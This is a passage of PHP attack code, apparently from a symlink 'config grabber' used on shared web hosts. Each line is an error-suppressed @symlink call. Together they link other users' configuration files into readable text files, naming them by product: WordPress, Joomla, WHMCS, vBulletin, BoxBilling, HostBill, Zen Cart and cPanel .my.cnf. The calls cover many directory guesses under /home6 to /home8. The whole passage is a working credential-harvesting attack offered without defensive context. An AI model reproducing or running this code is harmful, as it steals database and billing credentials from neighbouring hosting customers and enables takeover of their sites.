@symlink('/home6/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home6/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 7 

@symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home7/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home7/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home7/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 8 

@symlink('/home8/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home8/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home8/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
